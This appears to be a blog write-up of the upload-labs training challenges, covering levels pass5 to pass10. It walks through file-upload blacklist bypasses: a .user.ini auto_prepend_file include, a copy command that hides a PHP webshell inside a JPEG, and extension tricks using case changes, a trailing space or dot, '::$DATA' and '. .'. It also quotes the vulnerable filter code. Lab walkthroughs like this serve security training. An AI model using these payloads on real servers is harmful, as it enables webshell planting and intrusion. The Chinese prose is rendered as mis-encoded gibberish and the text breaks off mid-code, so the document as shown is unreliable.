title="åˆ©ç”¨.user.iniæœ¬åœ°åŒ…å«æ–‡ä»¶"></a>åˆ©ç”¨<code>.user.ini</code>æœ¬åœ°åŒ…å«æ–‡ä»¶</h3><p>åŸç†ï¼šåˆ©ç”¨.user.iniï¼Œä½¿å¾—ç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶è‡ªåŠ¨åŒ…å«æŸä¸ªæ–‡ä»¶~</p><p>æ¡ä»¶ï¼šopen_basediræ²¡æœ‰è¢«é™åˆ¶</p><p>ï¼ˆopen_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸï¼‰</p><p>å‡½æ•°ï¼šï¼ˆä¸ä¸€å®šè¦phpæ–‡ä»¶ï¼Œæ¯•ç«Ÿæ˜¯å®˜æ–¹æ–‡æ¡£ï¼‰</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_fileï¼šåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç  å‰ å…ˆæ‰§è¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„phpæ–‡ä»¶ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚<br><br><span class="hljs-built_in">auto</span>_append_fileï¼šåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç  å å…ˆæ‰§è¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„phpæ–‡ä»¶ã€‚ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ï¼šç›´æ¥å†™åœ¨.user.iniä¸­å³å¯ï¼Œtest.jpgå³ä¸ºè¦åŒ…å«çš„æ–‡ä»¶</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=test.jpg<br></code></pre></td></tr></table></figure><h3 id="bypass-4"><a href="#bypass-4" class="headerlink" title="bypass"></a>bypass</h3><p>1ã€å‡†å¤‡<code>å›¾ç‰‡ğŸ</code></p><p>ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ 1.jpgï¼›ä¸€ä¸ªåŒ…å«ğŸçš„1.phpæ–‡ä»¶ï¼›åˆå¹¶åå¾—åˆ°åä¸º2.jpgçš„å›¾ç‰‡ğŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">cmdä¸­ï¼š</span><br><span class="hljs-meta">#</span><span class="bash">/bæŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶; ç”¨äºå›¾åƒç±»/å£°éŸ³ç±»æ–‡ä»¶</span><br><span class="hljs-meta">#</span><span class="bash">/aæŒ‡å®šä»¥ASCIIæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ã€‚ç”¨äºtxtç­‰æ–‡æ¡£ç±»æ–‡ä»¶</span><br>copy  1.jpg/b + 1.php/a  2.jpg<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åå…­è¿›åˆ¶æ‰“å¼€å›¾ç‰‡ï¼Œå°†ä¸€å¥è¯æœ¨é©¬æ’å…¥æœ€åº•å±‚</p><p><img src="https://i.loli.net/2021/02/13/uOTLmlvSxt8aeRr.png"></p><p>2ã€å‡†å¤‡<code>.user.ini</code></p><p> ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=ingo.jpg<br></code></pre></td></tr></table></figure><p><code>ingo.jpg</code>å°±æ˜¯è¦åŒ…å«çš„æ–‡ä»¶å•¦</p><p>3ã€æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨phpå¯ä»¥æ­£å¸¸è®¿é—®çš„æ–‡ä»¶ï¼ˆåº”å½“ä¸<code>.user.ini</code>åœ¨åŒä¸€è·¯å¾„ï¼‰</p><p>è¿™é‡Œæç¤ºäº†readme.php</p><p><img src="https://i.loli.net/2021/02/13/IlYt2H8sr5Dg6Cv.png"></p><p>é‚£ä¹ˆç›´æ¥è®¿é—®readme.phpå°±å¯ä»¥äº†</p><p><img src="https://i.loli.net/2021/02/13/msP6WIU3ilG4yez.png"></p><h2 id="pass6ï¼ˆé»‘åå•-å¤§å°å†™ç»•è¿‡ï¼‰"><a href="#pass6ï¼ˆé»‘åå•-å¤§å°å†™ç»•è¿‡ï¼‰" class="headerlink" title="pass6ï¼ˆé»‘åå•-å¤§å°å†™ç»•è¿‡ï¼‰"></a>pass6ï¼ˆé»‘åå•-å¤§å°å†™ç»•è¿‡ï¼‰</h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¦‚ä¸‹ï¼Œå»æ‰äº†<code>strtolower($file_ext)</code>å‡½æ•°ï¼ˆè½¬æ¢ä¸ºå°å†™ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br><span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br></code></pre></td></tr></table></figure><h3 id="bypass-5"><a href="#bypass-5" class="headerlink" title="bypass"></a>bypass</h3><p>å› æ­¤ç›´æ¥å¤§å°å†™ç»•è¿‡å¯¹åç¼€ååšæ‰‹è„šï¼š</p><p><img src="https://i.loli.net/2021/02/13/t6z3HOJNPckVU4b.png"></p><p>æ‰“å¼€å³å¯~</p><p>ä¸è¿‡ä¸çŸ¥é“ä¹‹å‰apacheé…ç½®é”™äº†ä¸€äº›å•¥â€“ç›´æ¥ç»™æˆ‘500äº†ï¼Œæ˜æ˜ä»¥å‰è¿˜è¡ŒQAQ</p><p>é…ç½®ç¯å¢ƒï¼Œè‹¦ä¸å ªè¨€</p><h2 id="pass7ï¼ˆé»‘åå•-ç©ºæ ¼ç»•è¿‡ï¼‰"><a href="#pass7ï¼ˆé»‘åå•-ç©ºæ ¼ç»•è¿‡ï¼‰" class="headerlink" title="pass7ï¼ˆé»‘åå•-ç©ºæ ¼ç»•è¿‡ï¼‰"></a>pass7ï¼ˆé»‘åå•-ç©ºæ ¼ç»•è¿‡ï¼‰</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å»æ‰äº†<code>trim($file_ext)</code>å‡½æ•°ï¼ˆé¦–å°¾å»ç©ºï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br></code></pre></td></tr></table></figure><h3 id="bypass-6"><a href="#bypass-6" class="headerlink" title="bypass"></a>bypass</h3><p>ç©ºæ ¼ç»•è¿‡ï¼š</p><p>åŸç†ï¼šåœ¨windowsä¸­ï¼Œä¼šè‡ªåŠ¨å»æ‰æ–‡ä»¶åç¼€åæœ«å°¾å¤„çš„ç©ºæ ¼</p><p>æŠ“åŒ…ï¼Œç›´æ¥åœ¨<code>.php</code>ååŠ ç©ºæ ¼å³å¯æˆåŠŸä¸Šä¼ ï¼š<code>&quot;.php &quot;</code></p><p><img src="https://i.loli.net/2021/02/13/vgNeAFd2fKhQDxE.png"></p><h2 id="pass8ï¼ˆé»‘åå•-â€œ-â€ç»•è¿‡ï¼‰"><a href="#pass8ï¼ˆé»‘åå•-â€œ-â€ç»•è¿‡ï¼‰" class="headerlink" title="pass8ï¼ˆé»‘åå•-â€œ.â€ç»•è¿‡ï¼‰"></a>pass8ï¼ˆé»‘åå•-â€œ.â€ç»•è¿‡ï¼‰</h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å»æ‰äº†<code>deldot($file_name)</code>(åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br><span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br></code></pre></td></tr></table></figure><h3 id="bypass-7"><a href="#bypass-7" class="headerlink" title="bypass"></a>bypass</h3><p>â€œ.â€ç»•è¿‡ï¼š</p><p>åŸç†ï¼šwindowsä¸­phpä¼šè‡ªåŠ¨å»é™¤åç¼€åä¸­æœ€åçš„ â€œ.â€ çš„ç¬¦å·</p><p>åŒpass7ï¼ŒæŠ“åŒ…åœ¨åç¼€åæœ«å°¾åŠ ä¸Š<code>.</code>ï¼š<code>.php.</code></p><p><img src="https://i.loli.net/2021/02/13/CZIt5d8uW3e6rDT.png"></p><h2 id="pass9ï¼ˆé»‘åå•-DATAç»•è¿‡ï¼‰"><a href="#pass9ï¼ˆé»‘åå•-DATAç»•è¿‡ï¼‰" class="headerlink" title="pass9ï¼ˆé»‘åå•-::$DATAç»•è¿‡ï¼‰"></a>pass9ï¼ˆé»‘åå•-::$DATAç»•è¿‡ï¼‰</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å»æ‰äº†<code>str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>å‡½æ•° (å»é™¤å­—ç¬¦ä¸²::$DATA)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br></code></pre></td></tr></table></figure><h3 id="bypass-8"><a href="#bypass-8" class="headerlink" title="bypass"></a>bypass</h3><p>::$DATAç»•è¿‡ï¼š</p><p>åŸç†ï¼šåˆ©ç”¨äº†Windowsä¸‹NTFSæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³NTFSæ–‡ä»¶ç³»ç»Ÿå­˜å‚¨æ•°æ®æµçš„ä¸€ä¸ªå±æ€§DATAã€‚<br>å½“è®¿é—®test.php::$DATAæ—¶ï¼Œå®é™…æ˜¯è¯·æ±‚test.phpæœ¬èº«çš„æ•°æ®</p><p>åˆè¯´ï¼šwindowsä¸‹ï¼Œphpï¼Œåœ¨æ–‡ä»¶ååé¢åŠ ä¸Š<code>::$DATA</code>ç³»ç»Ÿä¼šæŠŠå®ƒå½“ä½œæ–‡ä»¶æµæ¥è¿›è¡Œå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹æ–‡ä»¶çš„åç¼€åï¼Œä¸”ä¿ç•™::$DATAä¹‹å‰çš„æ–‡ä»¶åä»¥åŠåç¼€</p><p>è¿˜æœ‰ä¸€ä¸ªè¯´æ³•æ˜¯ï¼šWindowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åä¸­test.php::$DATAä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªtest.phpçš„æ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒï¼Œå¹¶è¢«è§£æã€‚</p><p>åŒ7ã€8ï¼ŒæŠ“åŒ…åœ¨åç¼€åŠ ä¸Š<code>::$DATA</code>å³å¯ï¼š</p><p><img src="https://i.loli.net/2021/02/13/5fzWIStRhy3Xqkr.png"></p><p>è®¿é—®è·¯å¾„çš„æ—¶å€™è¦æ³¨æ„å»æ‰åç¼€<code>::$DATA</code>æ‰èƒ½æˆåŠŸè®¿é—®ï¼Œå¦åˆ™æ‰¾ä¸åˆ°æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/02/13/nZvWVDsTpyGKf2b.png"></p><h2 id="pass10ï¼ˆé»‘åå•-ä»£ç å®¡è®¡ï¼‰"><a href="#pass10ï¼ˆé»‘åå•-ä»£ç å®¡è®¡ï¼‰" class="headerlink" title="pass10ï¼ˆé»‘åå•-ä»£ç å®¡è®¡ï¼‰"></a>pass10ï¼ˆé»‘åå•-ä»£ç å®¡è®¡ï¼‰</h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ps: å…¶ä»–å‡ é¢˜æ— éæ˜¯éƒ½å°è¯•ä¸€è¾¹ï¼Œè€Œè¿™é¢˜åœ¨é»‘ç›’æƒ…å†µä¸‹å±å®ä¸çŸ¥è¯¥æ€ä¹ˆåš==</p><p>å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å¯¹æ–‡ä»¶çš„ä¸Šä¼ è·¯å¾„è¿›è¡Œäº†æ›´æ”¹ï¼šæ‹¼æ¥çš„æ˜¯<code>$file_name</code>è€Œä¸æ˜¯<code>$file_ext</code>ï¼ˆpass5ä¹Ÿæ˜¯ï¼‰</p><p>è€Œåœ¨æºç ä¸­$file_nameçš„è¿‡æ»¤æªæ–½åªæ˜¯ç®€å•çš„å»æ‰æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œä½¿ç”¨<code>&#39;. .&#39;</code>å³å¯bypassï¼ˆå³<code>&#39;. .&#39;</code>ç»deldot()å¾—åˆ°<code>&#39;. &#39;</code>ï¼‰</p><pre><code>        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    #åŸ</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span 